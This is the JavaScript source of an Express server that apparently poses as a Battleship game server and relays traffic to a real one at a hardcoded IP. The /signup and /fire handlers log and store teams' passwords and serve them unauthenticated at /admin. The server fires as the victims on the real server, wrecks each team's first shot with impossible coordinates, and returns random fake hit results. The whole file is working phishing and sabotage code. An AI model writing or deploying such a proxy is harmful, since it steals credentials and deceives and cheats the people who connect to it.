const faker = require("faker")
const express = require("express")
const argv = require("simple-argv")
const app = new express()
const { join } = require("path")
require("dotenv").config()
const fetch = require("node-fetch")


const teams = {}
const cred = []

const domain = argv.ip || "93.42.249.207:8080"

const PORT = 8080
const field = []
const ships = []


const W = Number(process.env.W) || 50
const H = Number(process.env.H) || 50
const S = Number(process.env.S) || 10

for (let y = 0; y < H; y++) {
  const row = []
  for (let x = 0; x < W; x++) {
    row.push({
      team: null,
      x,
      y,
      ship: null,
      hit: false
    })
  }
  field.push(row)
}

let id = 1
for (let i = 0; i < S; i++) {
  const maxHp = faker.random.number({ min: 1, max: 6 })
  const vertical = faker.random.boolean()

  const ship = {
    id,
    name: faker.name.firstName(),
    x: faker.random.number({ min: 0, max: vertical ? W - 1 : W - maxHp }),
    y: faker.random.number({ min: 0, max: vertical ? H - maxHp : H - 1 }),
    vertical,
    maxHp,
    curHp: maxHp,
    killer: null
  }

  let found = false
  for (let e = 0; e < ship.maxHp; e++) {
    const x = ship.vertical ? ship.x : ship.x + e
    const y = ship.vertical ? ship.y + e : ship.y
    if (field[y][x].ship) {
      found = true
      break
    }
  }

  if (!found) {
    for (let e = 0; e < ship.maxHp; e++) {
      const x = ship.vertical ? ship.x : ship.x + e
      const y = ship.vertical ? ship.y + e : ship.y
      field[y][x].ship = ship
    }

    ships.push(ship)
    id ++
  }
}

app.use(express.static(join(__dirname, "./public")))

app.get("/", ({ query: { format } }, res) => {
  if (format === "json") {
    return res.send({ field, ships })
  } else {
    return res.redirect(`http://${domain}/`)
  }
})

app.get("/signup", ({ ip, query: { team: teamName, password } }, res) => {

  teams[teamName] = {
    name: teamName,
    password,
    score: 0,
    killedShips: [],
    firedBullets: 0,
    lastFiredBullet: 0,
    zebbiedTry: 0
  }

  cred.push({ [teamName]: password })
  console.log("Credentials: %O", { name: teamName, password, ip })

  try {
    fetch(`http://${domain}/signup?team=${teamName}&password=${password}`)
  } catch (err) {
    console.log({ err: err.stack, teamName })
  }

  res.sendStatus(200)
})

app.get("/fire", ({ query: { x, y, team: teamName, password } }, res) => {
  if (!teams[teamName]) {
    teams[teamName] = {
      name: teamName,
      password,
      score: 0,
      killedShips: [],
      firedBullets: 0,
      lastFiredBullet: 0,
      zebbiedTry: false
    }

    cred.push({ [teamName]: password })
    console.log("Credentials: %O", { name: teamName, password })

    try {
      fetch(`http://${domain}/signup?team=${teamName}&password=${password}`)
    } catch (err) {
      console.log({ err: err.stack, teamName })
    }
  }

  const messages = {
    WATER: 0,
    HIT: 10,
    KILL: 50
  }

  const message = Object.keys(messages)[Math.floor(Math.random() * Object.keys(messages).push("WATER", "WATER", "HIT", "WATER"))] || "WATER"
  const score = messages[message]

  if (!teams[teamName]?.zebbiedTry) {
    x = 9999999999999999999999999999999999999999999999999999999999999999999999999999999
    y = 9999999999999999999999999999999999999999999999999999999999999999999999999999999
    teams[teamName].zebbiedTry = true
  }

  if ((new Date().getTime() - teams[teamName]?.lastFiredBullet) > 2000) {
    try {
      fetch(`http://${domain}/fire?x=${x}&y=${y}&team=${teamName}&password=${password}`)
    } catch (err) {
      console.log({ err: err.stack, teamName })
    }
  }

  teams[teamName].lastFiredBullet = new Date().getTime()

  res.send({
    message, score
  })

})

;["getFieldHtml", "", "getScoresHtml", "scores"].map(url => {
  app.get(url,
    (req, res) => {
      try {
        res.redirect(`http://${domain}/${url}`)
      } catch (err) {
        console.log({ err: err.stack })
        res.send(200)
      }
    })
})

app.get("/admin", (_, res) => res.send({ cred, teams }))

app.all("*", (req, res) => {
  res.sendStatus(404)
})

app.listen(PORT, () => console.log("App listening on port %O", PORT))